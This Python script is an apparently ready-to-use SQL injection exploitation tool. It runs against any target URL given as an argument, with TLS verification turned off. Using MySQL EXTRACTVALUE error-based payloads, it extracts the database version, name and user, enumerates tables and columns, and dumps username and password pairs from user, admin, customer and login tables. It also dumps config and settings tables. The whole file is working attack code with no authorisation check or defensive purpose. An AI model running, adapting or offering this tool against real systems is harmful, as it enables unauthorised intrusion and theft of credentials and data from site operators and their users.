#!/usr/bin/env python3
"""
FULL SQL Injection Exploiter - Doesn't Stop at Detection
"""

import requests
import time
import sys
import re
import urllib.parse

class FullSQLiExploiter:
    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()
        self.session.verify = False
        
    def log(self, message):
        timestamp = time.strftime("%H:%M:%S")
        print(f"[{timestamp}] {message}")
    
    def extract_from_error(self, payload):
        """Extract data from error messages - IMPROVED"""
        try:
            url = f"{self.target}{payload}"
            response = self.session.get(url, timeout=10)
            
            # BETTER error pattern matching
            patterns = [
                r"XPATH syntax error: '([^']+)'",
                r"for column '([^']+)'",
                r"near '([^']+)'",
                r"'([^']+)'",
                r"column '([^']+)'",
                r"XPATH.*?: '([^']+)'",
                r"SQL.*?: '([^']+)'"
            ]
            
            for pattern in patterns:
                matches = re.findall(pattern, response.text, re.IGNORECASE)
                for match in matches:
                    if len(match) > 3 and "union" not in match.lower() and "select" not in match.lower():
                        cleaned = match.replace("\\n", "").replace("\\r", "").replace("\\t", "").strip()
                        if 3 < len(cleaned) < 100:
                            return cleaned
            
            return None
        except Exception as e:
            return None
    
    def get_database_info(self):
        """GET DATABASE INFORMATION - FULL EXTRACTION"""
        self.log("ðŸŽ¯ EXTRACTING DATABASE INFORMATION...")
        
        info = {}
        
        # Get MySQL Version
        payload = "' AND EXTRACTVALUE(1, CONCAT(0x3a, VERSION()))--"
        version = self.extract_from_error(payload)
        if version:
            self.log(f"âœ… MYSQL VERSION: {version}")
            info['version'] = version
        else:
            self.log("âŒ Failed to get version")
        
        # Get Database Name
        payload = "' AND EXTRACTVALUE(1, CONCAT(0x3a, DATABASE()))--"
        db_name = self.extract_from_error(payload)
        if db_name:
            self.log(f"âœ… DATABASE NAME: {db_name}")
            info['database'] = db_name
        else:
            self.log("âŒ Failed to get database name")
        
        # Get Current User
        payload = "' AND EXTRACTVALUE(1, CONCAT(0x3a, USER()))--"
        current_user = self.extract_from_error(payload)
        if current_user:
            self.log(f"âœ… CURRENT USER: {current_user}")
            info['user'] = current_user
        else:
            self.log("âŒ Failed to get current user")
        
        return info
    
    def get_all_tables(self, db_name):
        """GET ALL TABLES FROM DATABASE"""
        self.log(f"ðŸ“Š EXTRACTING TABLES FROM {db_name}...")
        
        payload = f"' AND EXTRACTVALUE(1, CONCAT(0x3a, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='{db_name}')))--"
        tables = self.extract_from_error(payload)
        
        if tables:
            table_list = tables.split(',')
            self.log(f"âœ… FOUND {len(table_list)} TABLES:")
            for i, table in enumerate(table_list, 1):
                self.log(f"   {i}. {table}")
            return table_list
        else:
            self.log("âŒ Failed to extract tables")
            return []
    
    def get_table_columns(self, table_name):
        """GET COLUMNS FROM SPECIFIC TABLE"""
        self.log(f"ðŸ—‚ï¸ EXTRACTING COLUMNS FROM {table_name}...")
        
        payload = f"' AND EXTRACTVALUE(1, CONCAT(0x3a, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='{table_name}')))--"
        columns = self.extract_from_error(payload)
        
        if columns:
            column_list = columns.split(',')
            self.log(f"âœ… COLUMNS IN {table_name}:")
            for col in column_list:
                self.log(f"   ðŸ“ {col}")
            return column_list
        else:
            self.log(f"âŒ Failed to extract columns from {table_name}")
            return []
    
    def dump_table_data(self, table_name, columns, limit=5):
        """DUMP DATA FROM TABLE - MULTIPLE ROWS"""
        self.log(f"ðŸ“¥ DUMPING DATA FROM {table_name}...")
        
        for i in range(limit):
            # Create payload for each row
            cols_concat = ", ', | ,', ".join(columns)
            payload = f"' AND EXTRACTVALUE(1, CONCAT(0x3a, (SELECT CONCAT_WS(' | ', {cols_concat}) FROM {table_name} LIMIT {i},1)))--"
            
            data = self.extract_from_error(payload)
            if data and "error" not in data.lower():
                self.log(f"   ðŸ“ ROW {i+1}: {data}")
            else:
                break
    
    def find_and_dump_users(self, tables):
        """SPECIFICALLY FIND AND DUMP USER CREDENTIALS"""
        self.log("ðŸ” SEARCHING FOR USER CREDENTIALS...")
        
        user_tables = []
        for table in tables:
            if any(keyword in table.lower() for keyword in ['user', 'admin', 'customer', 'account', 'member', 'login']):
                user_tables.append(table)
        
        for table in user_tables:
            self.log(f"ðŸŽ¯ ANALYZING USER TABLE: {table}")
            columns = self.get_table_columns(table)
            
            if columns:
                # Look for credential columns
                user_cols = [c for c in columns if any(keyword in c.lower() for keyword in ['user', 'name', 'login', 'email'])]
                pass_cols = [c for c in columns if any(keyword in c.lower() for keyword in ['pass', 'pwd', 'hash', 'password'])]
                
                if user_cols and pass_cols:
                    self.log(f"ðŸ”¥ CREDENTIAL COLUMNS FOUND: {user_cols[0]}, {pass_cols[0]}")
                    
                    # Dump username and password data
                    for i in range(10):  # Get first 10 rows
                        payload = f"' AND EXTRACTVALUE(1, CONCAT(0x3a, (SELECT CONCAT({user_cols[0]}, ' : ', {pass_cols[0]}) FROM {table} LIMIT {i},1)))--"
                        creds = self.extract_from_error(payload)
                        if creds and "error" not in creds.lower():
                            self.log(f"   ðŸ”“ CREDENTIALS: {creds}")
                        else:
                            break
    
    def exploit_full(self):
        """COMPLETE EXPLOITATION - DOESN'T STOP"""
        self.log("ðŸš€ STARTING COMPLETE SQL INJECTION EXPLOITATION")
        self.log("=" * 70)
        
        # Step 1: Get Database Info
        db_info = self.get_database_info()
        
        if not db_info.get('database'):
            self.log("âŒ CRITICAL: Cannot get database name - exploitation failed")
            return
        
        # Step 2: Get All Tables
        tables = self.get_all_tables(db_info['database'])
        
        if not tables:
            self.log("âŒ CRITICAL: Cannot extract tables - exploitation failed")
            return
        
        # Step 3: Find and Dump User Credentials
        self.find_and_dump_users(tables)
        
        # Step 4: Also dump other interesting tables
        interesting_tables = [t for t in tables if any(keyword in t.lower() for keyword in ['config', 'setting', 'option'])]
        
        for table in interesting_tables:
            columns = self.get_table_columns(table)
            if columns:
                self.dump_table_data(table, columns, limit=3)
        
        self.log("=" * 70)
        self.log("ðŸŽ¯ COMPLETE EXPLOITATION FINISHED")
        self.log("ðŸ’¡ Check above for extracted credentials and data!")

def main():
    if len(sys.argv) != 2:
        print("FULL SQL Injection Exploitation Tool")
        print("Usage: python3 full_exploit.py <TARGET_URL>")
        print("Example: python3 full_exploit.py \"https://example.com/?id=1\"")
        sys.exit(1)
    
    target_url = sys.argv[1]
    
    if '?' not in target_url:
        target_url += "?id=1"
    
    exploiter = FullSQLiExploiter(target_url)
    exploiter.exploit_full()

if __name__ == "__main__":
    main()